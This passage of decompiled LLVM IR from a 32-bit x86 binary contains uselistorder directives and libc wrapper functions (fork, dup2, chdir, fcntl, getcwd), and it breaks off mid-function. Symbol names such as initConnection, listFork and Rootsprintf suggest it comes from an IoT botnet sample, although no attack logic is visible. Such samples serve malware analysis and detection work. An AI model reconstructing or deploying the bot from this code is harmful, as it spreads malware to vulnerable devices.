  store i1 %v8_804d694, i1* %cf.global-to-local, align 1
  %v13_804d694 = icmp eq i32 %v0_804d689, -1
  %v1_804d698 = icmp eq i1 %v13_804d694, false
  br i1 %v1_804d698, label %dec_label_pc_804d1c9, label %dec_label_pc_804cfbb.outer

; uselistorder directives
  uselistorder i32 %v0_804d689, { 0, 2, 3, 1 }
  uselistorder i32 %stack_var_-60.3, { 1, 0 }
  uselistorder i32 %v0_804d67f, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-96.2.ph34, { 0, 2, 1 }
  uselistorder i8* %stack_var_-64.2.ph32, { 2, 1, 0 }
  uselistorder i32 %stack_var_-5832.2.ph27, { 1, 0, 2 }
  uselistorder i32 %stack_var_-28.1.ph, { 1, 0, 3, 4, 2 }
  uselistorder i32 %v4_804d668, { 0, 3, 1, 2, 4 }
  uselistorder i32 %storemerge251, { 3, 2, 0, 1 }
  uselistorder i32 %stack_var_-40.1.lcssa, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_804d627, { 2, 1, 0 }
  uselistorder i32 %v3_804d612, { 2, 1, 0, 3 }
  uselistorder i32 %stack_var_-40.0, { 0, 2, 1 }
  uselistorder i32 %v0_804d608, { 2, 1, 0 }
  uselistorder i32 %v1_804d5d2, { 1, 0 }
  uselistorder i32 %v1_804d5a0, { 1, 0 }
  uselistorder i32 %v5_804d578, { 1, 0 }
  uselistorder i32 %v4_804d575, { 2, 1, 0, 3, 4 }
  uselistorder i32 %stack_var_-40.173, { 0, 5, 4, 2, 3, 1 }
  uselistorder i8* %v3_804d585, { 2, 0, 1 }
  uselistorder i32 %v1_804d561, { 1, 0 }
  uselistorder i32 %v0_804d52a, { 0, 2, 1 }
  uselistorder i32 %storemerge23.in.in, { 3, 2, 1, 0 }
  uselistorder i32 %v0_804d4e7, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804d4c9, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804d4ad, { 0, 1, 4, 5, 3, 2, 6 }
  uselistorder i32 %v0_804d49a, { 1, 2, 0 }
  uselistorder i32 %v0_804d47f, { 1, 2, 3, 0 }
  uselistorder i1 %v0_804d442, { 1, 0 }
  uselistorder i32 %v7_804d440, { 1, 0 }
  uselistorder i8* %v22_804d3dc, { 1, 2, 0 }
  uselistorder i8* %storemerge15, { 1, 0 }
  uselistorder i32 %v5_804d404, { 3, 2, 1, 0 }
  uselistorder i32 %v2_804d3f5, { 1, 0 }
  uselistorder i32 %storemerge15.in245, { 2, 1, 0 }
  uselistorder i8* %storemerge15246, { 1, 0 }
  uselistorder i32 %v6_804d3af, { 1, 0 }
  uselistorder i32 %v6_804d387, { 1, 0 }
  uselistorder i32 %stack_var_-5832.1, { 1, 2, 0, 3 }
  uselistorder i32 %v6_804d362, { 1, 0 }
  uselistorder i32 %v1_804d377, { 1, 0, 2, 3, 5, 4 }
  uselistorder i8* %v5_804d33f, { 5, 0, 3, 1, 2, 4, 6, 8, 7 }
  uselistorder i32 %v1_804d33c, { 10, 9, 16, 14, 7, 8, 12, 11, 0, 4, 1, 2, 3, 13, 15, 6, 5, 17, 18, 19 }
  uselistorder i32 %v6_804d339, { 1, 0 }
  uselistorder i32 %v5_804d2ec, { 0, 1, 4, 3, 2 }
  uselistorder i32 %stack_var_-96.1, { 3, 4, 1, 2, 0 }
  uselistorder i32 %v4_804d2a5, { 1, 2, 4, 3, 5, 0 }
  uselistorder i32 %v3_804d291, { 0, 2, 1 }
  uselistorder i32 %v0_804d258, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v3_804d253, { 0, 2, 1 }
  uselistorder i32 %v0_804d241, { 1, 2, 0 }
  uselistorder i32 %v0_804d1e3, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32 %v0_804d1dd, { 1, 0, 2 }
  uselistorder i32 %storemerge17, { 2, 5, 4, 0, 3, 1 }
  uselistorder i32 %stack_var_-60.2, { 6, 3, 4, 1, 2, 0, 5, 8, 7 }
  uselistorder i32 %v0_804d032.in, { 0, 3, 2, 1 }
  uselistorder i32 %v0_804d16b, { 1, 0, 2 }
  uselistorder i32 %storemerge18, { 1, 3, 0, 2 }
  uselistorder i32 %v2_804d138, { 2, 0, 1 }
  uselistorder i32 %v1_804d121, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_804d0ec, { 1, 0 }
  uselistorder i32 %v0_804d091, { 1, 0, 2 }
  uselistorder i32 %storemerge19, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v2_804d060, { 1, 0, 2 }
  uselistorder i32 %.pre, { 0, 2, 1 }
  uselistorder i32 %v2_804d023, { 1, 0 }
  uselistorder i8* %storemerge16209, { 2, 0, 1, 3 }
  uselistorder i32 %v5_804d2d9, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v2_804d466, { 6, 7, 0, 1, 2, 3, 4, 5, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 %v2_804d673, { 15, 16, 0, 1, 6, 5, 7, 8, 2, 10, 9, 11, 12, 13, 14, 3, 4 }
  uselistorder i32 %v2_804cf21, { 1, 0, 2, 3 }
  uselistorder i32 %v3_804cec8, { 2, 1, 0, 3, 4 }
  uselistorder i8* %tmp186, { 1, 0, 2 }
  uselistorder i32 %v2_804ce4c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v7_804cdf9, { 1, 0 }
  uselistorder i32 %v3_804cec513, { 1, 0 }
  uselistorder i32 %stack_var_-88.0, { 5, 4, 1, 0, 3, 2, 6 }
  uselistorder i32* %tmp182, { 1, 0, 2 }
  uselistorder i1 %v5_804cd3c, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 %v2_804cd01, { 1, 0, 2 }
  uselistorder i1 %v5_804cced, { 3, 2, 0, 1, 4, 5 }
  uselistorder i32 %v2_804cc5d, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-24, { 2, 1, 0, 3 }
  uselistorder i8** %stack_var_-5888, { 22, 25, 21, 20, 19, 16, 15, 18, 17, 24, 23, 14, 12, 11, 13, 10, 9, 8, 7, 6, 0, 5, 4, 3, 2, 1 }
  uselistorder i32* %stack_var_-624, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-1648, { 1, 0, 2 }
  uselistorder i8** %stack_var_-36, { 3, 2, 1, 4, 0 }
  uselistorder i32* %edx.global-to-local, { 15, 16, 0, 1, 2, 3, 4, 5, 6, 7, 14, 9, 8, 10, 12, 11, 13, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 86, 87, 6, 4, 5, 135, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 24, 25, 19, 20, 21, 22, 23, 26, 27, 28, 29, 30, 39, 31, 32, 35, 36, 33, 34, 2, 3, 37, 38, 40, 41, 1, 0, 42, 43, 44, 47, 48, 49, 45, 46, 50, 51, 52, 53, 54, 55, 56, 57, 134, 133, 58, 59, 60, 61, 62, 63, 65, 66, 64, 67, 68, 69, 85, 70, 71, 74, 72, 73, 75, 76, 79, 77, 78, 80, 81, 82, 83, 84, 88, 89, 90, 92, 91, 136, 93, 94, 95, 96, 97, 100, 98, 99, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132 }
  uselistorder i1* %cf.global-to-local, { 60, 61, 2, 1, 121, 3, 4, 11, 5, 6, 7, 8, 9, 10, 120, 12, 13, 14, 19, 20, 15, 16, 17, 18, 21, 22, 23, 24, 25, 117, 28, 26, 27, 118, 29, 30, 0, 31, 32, 34, 35, 33, 36, 37, 38, 39, 116, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 59, 53, 54, 55, 56, 57, 58, 62, 63, 64, 67, 65, 66, 119, 68, 69, 70, 71, 72, 78, 79, 73, 74, 75, 115, 76, 77, 80, 81, 82, 85, 86, 87, 88, 89, 83, 84, 93, 94, 90, 91, 92, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 9, 8, 2, 1, 0, 7, 6, 5, 4, 3 }
  uselistorder i32 (i32, i32, i32)* @fdgets, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @szprintf, { 1, 0 }
  uselistorder i32 ()* @listFork, { 7, 3, 2, 1, 0, 6, 5, 4 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i8 13, { 0, 2, 1 }
  uselistorder i8 33, { 0, 2, 1 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_80561a0.19 to i32), { 2, 1, 0 }
  uselistorder i32 ()* @trim, { 1, 0 }
  uselistorder i32 (i32, i32)* @Rootsprintf, { 15, 14, 13, 0, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 16, 1 }
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 1, 0 }
  uselistorder i32 ()* @sleep, { 1, 0 }
  uselistorder i32 ()* @initConnection, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 (i32)* @zprintf, { 2, 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_805671b.179 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @__libc_fork, { 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_805670f.176 to i8*), { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_8056702.175 to i32), { 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_8056700.174 to i32), { 0, 2, 1 }
  uselistorder i32 ptrtoint ([19 x i8]* @global_var_80566ed.173 to i32), { 0, 2, 1 }
  uselistorder i32* inttoptr (i32 8 to i32*), { 5, 6, 0, 1, 2, 7, 3, 4 }
  uselistorder i32 (i32)* @init_rand, { 1, 0 }
  uselistorder i32 (i32)* @srand, { 2, 1, 0 }
  uselistorder i32 (i32*)* @__GI_time, { 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 18, 19, 20, 1, 2, 3, 4, 5, 6, 7, 21, 22 }
  uselistorder i32* inttoptr (i32 12 to i32*), { 6, 0, 1, 2, 3, 7, 5, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_80566ec.172 to i32), { 0, 3, 2, 4, 1 }
  uselistorder label %dec_label_pc_804d673.outer31, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d673.outer26, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d652, { 1, 0 }
  uselistorder label %dec_label_pc_804d608, { 1, 0 }
  uselistorder label %dec_label_pc_804d575, { 1, 0 }
  uselistorder label %dec_label_pc_804d549, { 1, 0 }
  uselistorder label %dec_label_pc_804d513, { 1, 0 }
  uselistorder label %dec_label_pc_804d3e7, { 1, 0 }
  uselistorder label %dec_label_pc_804d3d6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d3cd, { 1, 0 }
  uselistorder label %dec_label_pc_804d369, { 1, 0 }
  uselistorder label %dec_label_pc_804d301, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d2f8, { 1, 0 }
  uselistorder label %dec_label_pc_804d2cd, { 1, 0 }
  uselistorder label %dec_label_pc_804d1c6, { 1, 0 }
  uselistorder label %dec_label_pc_804d157, { 1, 0 }
  uselistorder label %dec_label_pc_804d135, { 1, 0 }
  uselistorder label %dec_label_pc_804d07d, { 1, 0 }
  uselistorder label %dec_label_pc_804d053, { 1, 0 }
  uselistorder label %dec_label_pc_804cfc4, { 1, 0 }
  uselistorder label %dec_label_pc_804cfbb.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804cf95, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804cf1c, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_804ce17, { 1, 0 }
  uselistorder label %dec_label_pc_804cd75, { 1, 0 }
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %v0_804d6aa = call i32 @vfork()
  %v5_804d6ad = icmp ult i32 %v0_804d6aa, -4095
  %v1_804d6b2 = icmp eq i1 %v5_804d6ad, false
  call void @__pseudo_cond_branch(i1 %v1_804d6b2, i32 134551768)
  ret i32 %v0_804d6aa
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804d6bc = load i32, i32* @edi, align 4
  %v0_804d6bd = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804d6d1 = add i32 %arg2, -12
  store i32 %arg3, i32* @edx, align 4
  %v6_804d6db = icmp ugt i32 %v1_804d6d1, 2
  br i1 %v6_804d6db, label %dec_label_pc_804d6eb, label %dec_label_pc_804d6dd

dec_label_pc_804d6dd:                             ; preds = %entry
  %v4_804d6e1 = call i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_804d6d1)
  br label %dec_label_pc_804d70d

dec_label_pc_804d6eb:                             ; preds = %entry
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804d6f3 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_804d6f3, i32* %ebx.global-to-local, align 4
  %tmp17 = icmp ult i32 %v2_804d6f3, -4095
  br i1 %tmp17, label %dec_label_pc_804d70b, label %dec_label_pc_804d6ff

dec_label_pc_804d6ff:                             ; preds = %dec_label_pc_804d6eb
  %v1_804d6ff = call i32 @__errno_location(i32 %v0_804d6bd)
  %v0_804d704 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d704 = sub i32 0, %v0_804d704
  %v2_804d706 = inttoptr i32 %v1_804d6ff to i32*
  store i32 %v1_804d704, i32* %v2_804d706, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d70b

dec_label_pc_804d70b:                             ; preds = %dec_label_pc_804d6eb, %dec_label_pc_804d6ff
  %v0_804d70b = phi i32 [ %v2_804d6f3, %dec_label_pc_804d6eb ], [ -1, %dec_label_pc_804d6ff ]
  br label %dec_label_pc_804d70d

dec_label_pc_804d70d:                             ; preds = %dec_label_pc_804d6dd, %dec_label_pc_804d70b
  %v0_804d712 = phi i32 [ %v4_804d6e1, %dec_label_pc_804d6dd ], [ %v0_804d70b, %dec_label_pc_804d70b ]
  store i32 %v0_804d6bd, i32* @ebx, align 4
  store i32 %v0_804d6bc, i32* @edi, align 4
  ret i32 %v0_804d712

; uselistorder directives
  uselistorder i32 %v2_804d6f3, { 1, 0, 2 }
  uselistorder i32 %v0_804d6bd, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 3, 2 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804d70d, { 1, 0 }
  uselistorder label %dec_label_pc_804d70b, { 1, 0 }
}

define i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d714 = load i32, i32* @edi, align 4
  store i32 %v0_804d714, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg3, i32* @edx, align 4
  %v0_804d72c = load i32, i32* @ebx, align 4
  %v1_804d734 = call i32 @int80_syscall(i32 221)
  store i32 %v1_804d734, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v1_804d734, -4095
  br i1 %tmp11, label %dec_label_pc_804d74c, label %dec_label_pc_804d740

dec_label_pc_804d740:                             ; preds = %entry
  %v1_804d740 = call i32 @__errno_location(i32 %v0_804d72c)
  %v0_804d745 = load i32, i32* %edi.global-to-local, align 4
  %v1_804d745 = sub i32 0, %v0_804d745
  %v2_804d747 = inttoptr i32 %v1_804d740 to i32*
  store i32 %v1_804d745, i32* %v2_804d747, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804d74c

dec_label_pc_804d74c:                             ; preds = %entry, %dec_label_pc_804d740
  %v0_804d74c = phi i32 [ %v1_804d734, %entry ], [ -1, %dec_label_pc_804d740 ]
  %v2_804d751 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d751, i32* %edi.global-to-local, align 4
  ret i32 %v0_804d74c

; uselistorder directives
  uselistorder i32 %v1_804d734, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d74c, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_804d755 = load i32, i32* @ebx, align 4
  store i32 %v0_804d755, i32* %stack_var_-8, align 4
  %v5_804d756 = icmp ult i32* %stack_var_-8, inttoptr (i32 4 to i32*)
  store i1 %v5_804d756, i1* @cf, align 1
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable

; uselistorder directives
  uselistorder i1* @cf, { 2, 0, 1 }
  uselistorder i32* inttoptr (i32 4 to i32*), { 2, 0, 1 }
}

define i32 @chdir(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d77c = load i32, i32* @edi, align 4
  store i32 %v0_804d77c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_804d784 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804d78c = call i32 @chdir(i32 %v0_804d784)
  store i32 %v0_804d784, i32* @ebx, align 4
  store i32 %v1_804d78c, i32* %edi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_804d78c, -4095
  br i1 %tmp8, label %dec_label_pc_804d7a4, label %dec_label_pc_804d798

dec_label_pc_804d798:                             ; preds = %entry
  %v1_804d798 = call i32 @__errno_location(i32 %v0_804d784)
  %v0_804d79d = load i32, i32* %edi.global-to-local, align 4
  %v1_804d79d = sub i32 0, %v0_804d79d
  %v2_804d79f = inttoptr i32 %v1_804d798 to i32*
  store i32 %v1_804d79d, i32* %v2_804d79f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804d7a4

dec_label_pc_804d7a4:                             ; preds = %entry, %dec_label_pc_804d798
  %v0_804d7a4 = phi i32 [ %v1_804d78c, %entry ], [ -1, %dec_label_pc_804d798 ]
  %v2_804d7a6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804d7a6, i32* @edx, align 4
  %v2_804d7a8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d7a8, i32* @edi, align 4
  ret i32 %v0_804d7a4

; uselistorder directives
  uselistorder i32 %v1_804d78c, { 1, 0, 2 }
  uselistorder i32 %v0_804d784, { 1, 0, 2 }
  uselistorder i32 (i32)* @chdir, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804d7a4, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d7ac = load i32, i32* @edi, align 4
  store i32 %v0_804d7ac, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804d7b4 = load i32, i32* @ebx, align 4
  %v1_804d7bc = call i32 @close(i32 %arg1)
  store i32 %v0_804d7b4, i32* @ebx, align 4
  store i32 %v1_804d7bc, i32* %edi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_804d7bc, -4095
  br i1 %tmp8, label %dec_label_pc_804d7d4, label %dec_label_pc_804d7c8

dec_label_pc_804d7c8:                             ; preds = %entry
  %v1_804d7c8 = call i32 @__errno_location(i32 %v0_804d7b4)
  %v0_804d7cd = load i32, i32* %edi.global-to-local, align 4
  %v1_804d7cd = sub i32 0, %v0_804d7cd
  %v2_804d7cf = inttoptr i32 %v1_804d7c8 to i32*
  store i32 %v1_804d7cd, i32* %v2_804d7cf, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804d7d4

dec_label_pc_804d7d4:                             ; preds = %entry, %dec_label_pc_804d7c8
  %v0_804d7d4 = phi i32 [ %v1_804d7bc, %entry ], [ -1, %dec_label_pc_804d7c8 ]
  %v2_804d7d6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804d7d6, i32* @edx, align 4
  %v2_804d7d8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d7d8, i32* @edi, align 4
  ret i32 %v0_804d7d4

; uselistorder directives
  uselistorder i32 %v1_804d7bc, { 1, 0, 2 }
  uselistorder i32 %v0_804d7b4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804d7d4, { 1, 0 }
}

define i32 @dup2(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804d7dc = load i32, i32* @ebx, align 4
  store i32 %v0_804d7dc, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_804d7ef = call i32 @dup2(i32 %v0_804d7dc, i32 %tmp4)
  store i32 %v2_804d7ef, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_804d7ef, -4095
  br i1 %tmp8, label %dec_label_pc_804d808, label %dec_label_pc_804d7fc

dec_label_pc_804d7fc:                             ; preds = %entry
  %v0_804d7fc = load i32, i32* %stack_var_-4, align 4
  %v1_804d7fc = call i32 @__errno_location(i32 %v0_804d7fc)
  %v0_804d801 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d801 = sub i32 0, %v0_804d801
  %v2_804d803 = inttoptr i32 %v1_804d7fc to i32*
  store i32 %v1_804d801, i32* %v2_804d803, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d808

dec_label_pc_804d808:                             ; preds = %entry, %dec_label_pc_804d7fc
  %v0_804d808 = phi i32 [ %v2_804d7ef, %entry ], [ -1, %dec_label_pc_804d7fc ]
  %v2_804d80c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d80c, i32* @ebx, align 4
  ret i32 %v0_804d808

; uselistorder directives
  uselistorder i32 %v2_804d7ef, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @dup2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d808, { 1, 0 }
}

define i32 @__libc_fork(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d810 = load i32, i32* @ebx, align 4
  store i32 %v0_804d810, i32* %stack_var_-4, align 4
  %v1_804d819 = call i32 @fork(i32 %v0_804d810)
  store i32 %v1_804d819, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_804d819, -4095
  br i1 %tmp6, label %dec_label_pc_804d830, label %dec_label_pc_804d824

dec_label_pc_804d824:                             ; preds = %entry
  %v0_804d824 = load i32, i32* %stack_var_-4, align 4
  %v1_804d824 = call i32 @__errno_location(i32 %v0_804d824)
  %v0_804d829 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d829 = sub i32 0, %v0_804d829
  %v2_804d82b = inttoptr i32 %v1_804d824 to i32*
  store i32 %v1_804d829, i32* %v2_804d82b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d830

dec_label_pc_804d830:                             ; preds = %entry, %dec_label_pc_804d824
  %v0_804d830 = phi i32 [ %v1_804d819, %entry ], [ -1, %dec_label_pc_804d824 ]
  %v2_804d832 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804d832, i32* @edx, align 4
  %v2_804d834 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d834, i32* @ebx, align 4
  ret i32 %v0_804d830

; uselistorder directives
  uselistorder i32 %v1_804d819, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d830, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-44, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %v0_804d838 = load i32, i32* @ebp, align 4
  %v0_804d839 = load i32, i32* @edi, align 4
  %v0_804d83a = load i32, i32* @esi, align 4
  %v0_804d83b = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebp, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804d847 = icmp eq i32 %arg2, 0
  %v1_804d849 = icmp eq i1 %v1_804d847, false
  br i1 %v1_804d849, label %dec_label_pc_804d874, label %dec_label_pc_804d84b

dec_label_pc_804d84b:                             ; preds = %entry
  %v1_804d84b = icmp eq i32 %arg1, 0
  br i1 %v1_804d84b, label %dec_label_pc_804d85f, label %dec_label_pc_804d84f

dec_label_pc_804d84f:                             ; preds = %dec_label_pc_804d84b
  %v1_804d84f = call i32 @__errno_location(i32 %v0_804d83b)
  %v1_804d854 = inttoptr i32 %v1_804d84f to i32*
  store i32 22, i32* %v1_804d854, align 4
  br label %dec_label_pc_804d8e5

dec_label_pc_804d85f:                             ; preds = %dec_label_pc_804d84b
  %v3_804d85f = call i32 @__GI_getpagesize(i32 %v0_804d83b, i32 %v0_804d83a, i32 %v0_804d839)
  store i32 %v3_804d85f, i32* @ebx, align 4
  %v5_804d86b = icmp slt i32 %v3_804d85f, 4096
  br i1 %v5_804d86b, label %dec_label_pc_804d86d, label %dec_label_pc_804d87c

dec_label_pc_804d86d:                             ; preds = %dec_label_pc_804d85f
  store i32 4096, i32* @ebx, align 4
  br label %dec_label_pc_804d87c

dec_label_pc_804d874:                             ; preds = %entry
  store i32 %arg2, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_804d878 = icmp eq i32 %arg1, 0
  %v1_804d87a = icmp eq i1 %v1_804d878, false
  br i1 %v1_804d87a, label %dec_label_pc_804d88e, label %dec_label_pc_804d87c

dec_label_pc_804d87c:                             ; preds = %dec_label_pc_804d85f, %dec_label_pc_804d874, %dec_label_pc_804d86d
  %v0_804d87f = phi i32 [ %v3_804d85f, %dec_label_pc_804d85f ], [ %arg2, %dec_label_pc_804d874 ], [ 4096, %dec_label_pc_804d86d ]
  store i32 %v0_804d87f, i32* %stack_var_-44, align 4
  %v1_804d880 = call i32 @malloc(i32 %v0_804d87f)
  store i32 %v1_804d880, i32* @esi, align 4
  %v1_804d88a = icmp eq i32 %v1_804d880, 0
  br i1 %v1_804d88a, label %dec_label_pc_804d8e5, label %dec_label_pc_804d87c.dec_label_pc_804d88e_crit_edge

dec_label_pc_804d87c.dec_label_pc_804d88e_crit_edge: ; preds = %dec_label_pc_804d87c
  %v0_804d899.pre = load i32, i32* %stack_var_-44, align 4
  br label %dec_label_pc_804d88e

dec_label_pc_804d88e:                             ; preds = %dec_label_pc_804d87c.dec_label_pc_804d88e_crit_edge, %dec_label_pc_804d874
  %v0_804d899 = phi i32 [ %v0_804d899.pre, %dec_label_pc_804d87c.dec_label_pc_804d88e_crit_edge ], [ %tmp11, %dec_label_pc_804d874 ]
  %v0_804d88e = phi i32 [ %v1_804d880, %dec_label_pc_804d87c.dec_label_pc_804d88e_crit_edge ], [ %arg1, %dec_label_pc_804d874 ]
  store i32 %v0_804d88e, i32* @ebx, align 4
  %v2_804d899 = call i32 @getcwd(i32 %v0_804d899, i32 %tmp12)
  %v0_804d89b = load i32, i32* @ebx, align 4
  store i32 %v0_804d89b, i32* @edx, align 4
  store i32 %v2_804d899, i32* @ebx, align 4
  %tmp18 = icmp ult i32 %v2_804d899, -4095
  br i1 %tmp18, label %dec_label_pc_804d8b1, label %dec_label_pc_804d8a6

dec_label_pc_804d8a6:                             ; preds = %dec_label_pc_804d88e
  %v0_804d8a6 = load i32, i32* %stack_var_-44, align 4
  %v1_804d8a6 = call i32 @__errno_location(i32 %v0_804d8a6)
  %v0_804d8ab = load i32, i32* @ebx, align 4
  %v1_804d8ab = sub i32 0, %v0_804d8ab
  store i32 %v1_804d8ab, i32* @ebx, align 4
  %v2_804d8ad = inttoptr i32 %v1_804d8a6 to i32*
  store i32 %v1_804d8ab, i32* %v2_804d8ad, align 4
  br label %dec_label_pc_804d8d3

dec_label_pc_804d8b1:                             ; preds = %dec_label_pc_804d88e
  %v2_804d8b1 = icmp slt i32 %v2_804d899, 0
  br i1 %v2_804d8b1, label %dec_label_pc_804d8d3, label %dec_label_pc_804d8b5

dec_label_pc_804d8b5:                             ; preds = %dec_label_pc_804d8b1
  %v0_804d8b5 = load i32, i32* @edi, align 4
  %v1_804d8b5 = icmp eq i32 %v0_804d8b5, 0
  %v1_804d8b7 = icmp eq i1 %v1_804d8b5, false
  br i1 %v1_804d8b7, label %dec_label_pc_804d8e7, label %dec_label_pc_804d8b9

dec_label_pc_804d8b9:                             ; preds = %dec_label_pc_804d8b5
  br i1 %v1_804d849, label %dec_label_pc_804d8cf, label %dec_label_pc_804d8bd

dec_label_pc_804d8bd:                             ; preds = %dec_label_pc_804d8b9
